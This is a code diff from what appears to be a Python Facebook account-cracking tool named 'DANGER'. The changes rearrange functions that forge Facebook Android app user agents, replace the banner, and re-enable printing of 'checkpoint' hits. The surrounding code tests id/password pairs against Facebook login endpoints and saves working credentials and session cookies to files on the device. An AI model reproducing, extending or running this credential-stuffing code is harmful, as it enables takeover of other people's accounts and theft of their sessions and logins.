@@ -271,23 +271,6 @@ srange = 0
 saved = []
 totaldmp = 0
 filter = []
-def randBuildLSB():
-    vchrome = str(random.randint(100,925))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
-    VAPP = random.randint(410000000,499999999)
-    END = '[FBAN/FB4A;FBAV/76.0.0.7677;FBBV/5559051;[FBAN/FB4A;FBAV/352.0.0.21.117;FBBV/348184932;FBDM/{density=3.0,width=1080,height=2102};FBLC/en_IN;FBRV/0;FBCR/MLS;FBMF/Magic;FBBD/Magic;FBPN/com.facebook.katana;FBDV/iQ3204;FBSV/5.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
-    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/SP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
-    return ua
-
-def randFBAN():
-  VAPP = random.randint(410000000,499999999)
-  ua="[FBAN/FB4A;FBAV/68.0.0.3593;FBBV/"+str(VAPP)+";FBDM/{density=2.5,width=780,height=1920};FBLC/fr_IN;FBRV/4214899694;FBCR/1030;FBMF/Realme;FBBD/Ostin;FBPN/com.facebook.katana;FBDV/"+random.choice(model2)+";FBSV/16;FBOP/5;FBCA/arm64-v8a:;]"
-  return ua
-
-def randBuildvsskj():
-    END = '[FBAN/FB4A;FBAV/49.0.0.4120;FBBV/9006006;[FBAN/FB4A;FBAV/352.0.0.21.117;FBBV/348184932;FBDM/{density=3.0,width=1080,height=2102};FBLC/en_IN;FBRV/0;FBCR/MLS;FBMF/Magic;FBBD/Magic;FBPN/com.facebook.katana;FBDV/iQ3204;FBSV/5.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
-    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/DANGER2A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
-    return ua
-    
 ugen=[]
 for agent in range(random.randint(89999, 100000)):
     a='Mozilla/5.0 (iPod/'
@@ -320,6 +303,23 @@ for agent in range(random.randint(89999, 100000)):
     t=random.randrange(1,9)
     fullagent=f'{a}{aa}{a1} {b} {n} {c};  {m}{d}{e}{f}) {g}{o}.{p}.{q} {r}{h}.{i}.{j}.{k} {l}{ll}.{l1}.{l2} {l3}{l4} {l5}{s}.{t}'
     ugen.append(fullagent)
+    
+def randBuildLSB():
+   vchrome = "83.0.0." + str(random.randint(1, 8)) + "." + str(random.randint(40, 150))
+   VAPP = random.randint(410000000, 499999999)
+   END = '[FBAN/FB4A;FBAV/76.0.0.7677;FBBV/5559051;[FBAN/FB4A;FBAV/352.0.0.21.117;FBBV/348184932;FBDM/{density=3.0,width=1080,height=2102};FBLC/en_IN;FBRV/0;FBCR/MLS;FBMF/Magic;FBBD/Magic;FBPN/com.facebook.katana;FBDV/iQ3204;FBSV/5.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
+   ua = f'Mozilla/5.0 (Linux; Android {random.randint(4, 13)}; {random.choice(model2)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{vchrome} Mobile Safari/537.36 ' + END
+   return ua
+
+def randFBAN():
+  VAPP = random.randint(410000000,499999999)
+  ua="[FBAN/FB4A;FBAV/68.0.0.3593;FBBV/"+str(VAPP)+";FBDM/{density=2.5,width=780,height=1920};FBLC/fr_IN;FBRV/4214899694;FBCR/1030;FBMF/Realme;FBBD/Ostin;FBPN/com.facebook.katana;FBDV/"+random.choice(model2)+";FBSV/16;FBOP/5;FBCA/arm64-v8a:;]"
+  return ua
+
+def randBuildvsskj():
+    END = '[FBAN/FB4A;FBAV/49.0.0.4120;FBBV/9006006;[FBAN/FB4A;FBAV/352.0.0.21.117;FBBV/348184932;FBDM/{density=3.0,width=1080,height=2102};FBLC/en_IN;FBRV/0;FBCR/MLS;FBMF/Magic;FBBD/Magic;FBPN/com.facebook.katana;FBDV/iQ3204;FBSV/5.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
+    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/DANGER2A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
+    return ua
 
 sys.stdout.write('\x1b]2; DANGER\x07')
 S = '\033[1;37m'
@@ -328,13 +328,10 @@ R = '\x1b[38;5;46m'
 F = '\x1b[38;5;48m'
 Z = '\033[1;33m'
 head = {'Host': 'adsmanager.facebook.com', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'viewport-width': '980'}
-logo ="""\033[1;32m
-d8888b.  .d8b.  d8b   db  d888b  d88888b d8888b. 
-88  `8D d8' `8b 888o  88 88' Y8b 88'     88  `8D 
-88   88 88ooo88 88V8o 88 88      88ooooo 88oobY' 
-88   88 88~~~88 88 V8o88 88  ooo 88~~~~~ 88`8b   
-88  .8D 88   88 88  V888 88. ~8~ 88.     88 `88. 
-Y8888D' YP   YP VP   V8P  Y888P  Y88888P 88   YD 
+logo ="""
+\033[1;33m  ░█▀▀▀█ ░█─░█ ─█▀▀█ ░█▄─░█ ▀▀█▀▀ ░█▀▀▀█ 
+\033[1;32m  ─▀▀▀▄▄ ░█▀▀█ ░█▄▄█ ░█░█░█ ─░█── ░█──░█ 
+\033[1;36m  ░█▄▄▄█ ░█─░█ ░█─░█ ░█──▀█ ─░█── ░█▄▄▄█
 \033[1;33m~~~~\033[1;32mD\033[1;33mA \033[1;34mN \033[1;35mG \033[1;36mE \033[1;37mR~~~\033[1;37m[X\033[1;37mD]
 \033[1;32m--------------------------------------------------------
 \033[1;37m[\033[1;31m•\033[1;37m]\033[1;31m  DEVELOPER    :   \033[1;31mNot Found
@@ -550,7 +547,7 @@ class main_crack():
                     open('/sdcard/DANGER_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/DANGER_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     break
                 elif 'www.facebook.com' in q['error']['message']:
-                    #print(f"\r{A} [DANGER-CP] {sid} | {ps} {S}")
+                    print(f"\r{A} [DANGER-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/DANGER_CP.txt','a').write(sid+'|'+ps+'\n')
                 else:
@@ -585,7 +582,7 @@ class main_crack():
                     open('/sdcard/DANGER_OK.txt','a').write(sid+'|'+ps+'\n')
                     break
                 elif 'checkpoint' in session.cookies.get_dict():
-                    #print(f"\r{A} [DANGER-CP] {sid} | {ps} {S}")
+                    print(f"\r{A} [DANGER-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/DANGER_CP.txt','a').write(sid+'|'+ps+'\n')
                     break
